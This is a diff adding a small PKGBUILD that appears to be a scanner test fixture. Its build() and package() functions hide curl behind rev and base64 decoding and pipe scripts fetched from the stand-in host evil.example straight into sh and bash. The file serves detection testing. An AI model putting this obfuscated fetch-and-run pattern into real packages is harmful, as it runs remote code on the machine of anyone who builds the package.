@@ -1,0 +1,19 @@
+# Maintainer: fixture <fixture@evil.example>
+# Command execution hidden behind static rev and base64 substitutions,
+# including a multiline base64 decode.
+pkgname=rev-b64-subst
+pkgver=1.0.0
+pkgrel=1
+arch=('any')
+
+build() {
+  c=$(echo 'lruc' | rev)
+  $c -s https://evil.example/payload.sh | sh
+}
+
+package() {
+  x=$(echo 'YQpiCmM=' | base64 -d)
+  : $x
+  b=$(echo 'Y3VybA==' | base64 -d)
+  $b -s https://evil.example/stage2.sh | bash
+}
